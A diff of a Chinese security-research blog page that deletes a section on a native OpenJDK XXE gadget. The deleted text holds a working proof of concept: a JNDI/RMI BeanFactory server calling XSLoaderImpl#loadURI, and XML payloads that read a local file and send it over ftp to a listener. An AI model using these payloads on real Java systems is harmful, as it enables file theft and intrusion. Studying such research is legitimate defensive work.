@@ -488,14 +488,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.6k
+                    3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    16 分
+                    13 分
                 </div>
                 
 
@@ -897,72 +897,7 @@ class UsableMethod extends Method {
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><code>return new SpelExpression(expressionString, ast, this.configuration);</code>相当于我们构造到<code>Expression expression = parser.parseExpression(spel);</code>，但是最关键的<code>getValue</code>并没有办法触发。</p>
-<h2 id="0x06-openjdk-java原生利用点"><a href="#0x06-openjdk-java原生利用点" class="headerlink" title="0x06 openjdk java原生利用点"></a>0x06 openjdk java原生利用点</h2><p>陆陆续续分析了茫茫多的第三方库，眼都看花了。也就几处能实现请求远程资源的利用点，做出网探测是ok的，但是没什么意义。那就搞波大的，自己编译一手openjdk生成codeql数据库，看能不能找到合理的利用方式。</p>
-<p>openjdk版本：8u332</p>
-<p>藏青师傅在文中也提到过：</p>
-<blockquote>
-<p>因为通过<code>ScriptEngine</code>来执行命令，都需要两个参数，所以不能通过ScriptEngine调用执行命令。</p>
-</blockquote>
-<p>这就意味着openjdk下不太可能会有rce了。所以我一开始也没把目光锁在openjdk上，但是codeql数据库构造成功之后还是想看一眼，于是找到了一处利用方式：</p>
-<h3 id="xxe-loadURI"><a href="#xxe-loadURI" class="headerlink" title="xxe:loadURI"></a>xxe:loadURI</h3><p>实际上有两处<code>loadURI</code>方法都是可以用的，结果一样，这里只介绍其中一个，存在于<code>com.sun.org.apache.xerces.internal.impl.xs.XSLoaderImpl#loadURI</code></p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">XSModel</span> <span class="token function">loadURI</span><span class="token punctuation">(</span><span class="token class-name">String</span> uri<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token keyword">try</span> <span class="token punctuation">{</span>
-            fGrammarPool<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">XSGrammar</span><span class="token punctuation">)</span> fSchemaLoader<span class="token punctuation">.</span><span class="token function">loadGrammar</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">XMLInputSource</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> uri<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toXSModel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>
-            fSchemaLoader<span class="token punctuation">.</span><span class="token function">reportDOMFatalError</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>当我们传入的参数为远程的url时，<code>loadGrammar</code>方法会调用<code>loadSchema</code></p>
-<p><img src="https://s2.loli.net/2022/07/08/vzDmnEPhqiAsrfx.png" alt="image-20220708171930978"></p>
-<p>经过一系列调用会加载远程的xml文件并且解析，调用栈如图：</p>
-<p><img src="https://s2.loli.net/2022/07/08/zLV6TWdmX5Z3hFI.png" alt="image-20220708172944391"></p>
-<p>到这里思路就比较清晰了，这是一个可利用的openjdk原生的xxe。</p>
-<h3 id="Blind-OOB-XXE"><a href="#Blind-OOB-XXE" class="headerlink" title="Blind OOB XXE"></a>Blind OOB XXE</h3><p>poc:</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span>
-
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>
-        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-        <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xerces.internal.impl.xs.XSLoaderImpl"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>
-                <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=loadURI"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span> <span class="token string">"http://127.0.0.1:8000/exp.xml"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>exp.xml:</p>
-<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
-<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">cdl</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY % asd SYSTEM "http://127.0.0.1:8000/evil.xml"&gt;%asd;%c;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cdl</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;rrr;">&amp;rrr;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cdl</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>evil.xml:</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY <span class="token operator">%</span> d SYSTEM <span class="token string">"file:///C:/Users/xxxxx/test/test"</span><span class="token operator">&gt;</span>
-<span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY <span class="token operator">%</span> c <span class="token string">"&lt;!ENTITY rrr SYSTEM 'ftp://127.0.0.1:2121/%d;'&gt;"</span><span class="token operator">&gt;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>把上面两个文件扔到文件夹下，用python的http.server快速模拟一个恶意服务器，用file协议读取本地文件（当然也可以换成netdoc协议），再用ftp协议发送到接收的端口2121。起简易ftp服务器接受OOB数据推荐一个好用的项目：<a target="_blank" rel="noopener" href="https://github.com/lc/230-OOB">https://github.com/lc/230-OOB</a></p>
-<p><img src="https://s2.loli.net/2022/07/08/zP5mxcnZeCM6Sd4.png" alt="image-20220708173847818"></p>
-<p><img src="https://s2.loli.net/2022/07/08/f3LUJid5FaIlE7H.png" alt="image-20220708173907954"></p>
-<p>在<code>/C:/Users/xxxxx/test/test</code>里定义一行内容”attack success!!!”</p>
-<p>触发漏洞后：</p>
-<p><img src="https://s2.loli.net/2022/07/08/hQ6wj8Iocv7yft2.png" alt="image-20220708174251027"></p>
-<p>ftp成功获取到读文件的内容</p>
-<p><img src="https://s2.loli.net/2022/07/08/Nb49qYp3aLTIsMF.png" alt="image-20220708174312220"></p>
-<p>这里只是验证了存在xxe，关于java下xxe漏洞的更多利用方式与jdk限制请移步@K0rz3n文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p>
+<h2 id="0x06-openjdk-java原生利用点"><a href="#0x06-openjdk-java原生利用点" class="headerlink" title="0x06 openjdk java原生利用点"></a>0x06 openjdk java原生利用点</h2><p>FBI warning</p>
 <h2 id="0x07后记"><a href="#0x07后记" class="headerlink" title="0x07后记"></a>0x07后记</h2><p>起初只是想用codeql玩一下，看能不能找到浅蓝师傅已经公布的利用方式，但是越走越深，最后甚至big胆到去扫openjdk，但找到了一种利用方式也算没白忙活吧。</p>
 <p>codeql短短二十行代码就能将有用的类或方法筛选出来，确实是非常好用的工具。但是对于企业业务来说，给项目构建codeql数据库本身就是一件很难实现的事情，但是在其实现之前我们仍可以用codeql减少很多代码审计工作量。</p>
 <p>(浅蓝yyds)</p>
